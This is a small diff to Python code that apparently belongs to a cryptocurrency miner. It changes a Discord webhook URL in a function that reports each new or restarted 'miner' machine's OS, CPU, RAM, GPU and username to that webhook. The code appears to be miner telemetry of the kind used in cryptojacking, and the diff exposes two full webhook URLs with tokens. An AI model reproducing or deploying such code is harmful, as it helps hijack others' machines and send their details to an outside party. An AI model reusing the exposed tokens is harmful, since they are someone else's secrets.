@@ -41,7 +41,7 @@ def simplog():
       "content" : "**New miner added or restarted.**\n```> OS Name: {}\n> OS Version: {}\n> CPU: {}\n> RAM: {} GB\n> Graphics Card-1: {}```".format(os_name, os_version, proc_info.Name, system_ram, gpu.Name),
       "username" : "{}".format(computer_info.Username)
       }            
-   requests.post("https://discord.com/api/webhooks/1032678220287442975/fzP0Nc3F2QrPqNcA-Jb-whD1fGJFNZdd4aL70lyg3DOhqJJ3Mp3McH1q3vly4GAQqqTu", json = data)
+   requests.post("https://canary.discord.com/api/webhooks/1039956128613797959/Rb9edk0FXsUZwZdUd2_XhBG9gXtRe8GeLNWenPNlp2q8mKoicT0mAPPjCIKLHY-1d1dd", json = data)
    time.sleep(3)
  
 def xm():
